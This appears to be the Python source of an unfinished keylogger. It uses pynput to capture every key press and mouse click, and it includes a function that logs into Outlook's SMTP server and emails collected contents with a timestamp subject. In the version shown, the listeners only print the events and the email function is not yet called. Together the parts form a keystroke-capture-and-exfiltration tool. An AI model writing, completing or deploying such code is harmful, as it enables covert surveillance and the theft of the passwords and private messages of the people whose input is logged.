#!/usr/bin/env python3

from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard, mouse
import smtplib

"""
    EMAIL SENDING
"""

def timestamp():
    right_now = datetime.now()
    return right_now.strftime('%d/%m/%Y - %H:%M')

def construct_mime(email_address, contents):
    message = MIMEMultipart()
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = timestamp()
    message.attach(MIMEText(contents, 'plain'))
    
    return message

def send_email(email_address, password, contents):
    server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    server.starttls()
    server.login(email_address, password)

    mime_object = construct_mime(email_address, contents)
    server.send_message(mime_object)

    server.quit()

"""
    MONITORING
"""

class Monitor:
    # TODO: Log that I thought this'd be a problem!
    def on_press(self, key):
        print(key)
    
    def on_click(self, x, y, button, pressed):
        if pressed:
            print(button)

    def __init__(self):
        self.keys = keyboard.Listener(on_press=self.on_press)
        self.mice = mouse.Listener(on_click=self.on_click)
    
    def run(self):
        self.keys.start()
        self.mice.start()
        self.keys.join()
        self.mice.join()

def main():
    monitor = Monitor()
    monitor.run()

if __name__ == '__main__':
    main()
